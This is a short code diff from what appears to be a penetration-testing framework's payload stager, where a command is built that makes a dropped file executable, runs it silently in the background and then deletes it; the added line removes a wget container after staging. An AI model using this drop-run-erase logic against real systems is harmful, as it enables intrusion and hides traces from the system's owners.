@@ -93,6 +93,7 @@ class Handler(TCP):
             sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}\n".encode())
         else:
             sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} 2>/dev/null &' {delim} rm {path}")
+        requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
